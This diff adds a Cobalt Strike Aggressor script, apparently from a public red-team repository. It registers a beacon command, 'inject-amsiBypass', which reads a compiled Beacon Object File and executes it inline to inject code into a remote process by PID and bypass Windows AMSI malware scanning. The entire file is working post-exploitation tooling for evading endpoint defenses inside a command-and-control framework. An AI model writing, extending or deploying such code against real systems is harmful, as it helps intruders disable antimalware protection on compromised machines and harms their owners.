@@ -1,0 +1,21 @@
+beacon_command_register(
+    "inject-amsiBypass", 
+    "Bypass AMSI in a remote process with code injection.", 
+    "Synopsis: inject-amsiBypass PID"
+);
+
+alias inject-amsiBypass {
+    if(size(@_) != 2)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("inject-amsiBypass"));
+        return;
+    }
+    local('$handle $data $args');
+    $handle = openf(script_resource("inject-amsiBypass.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    $args = bof_pack($1, "i",$2);
+    btask($1, "Inject AMSI Bypass (@0xBoku|github.com/boku7)");
+    beacon_inline_execute($1, $data, "go", $args);
+}
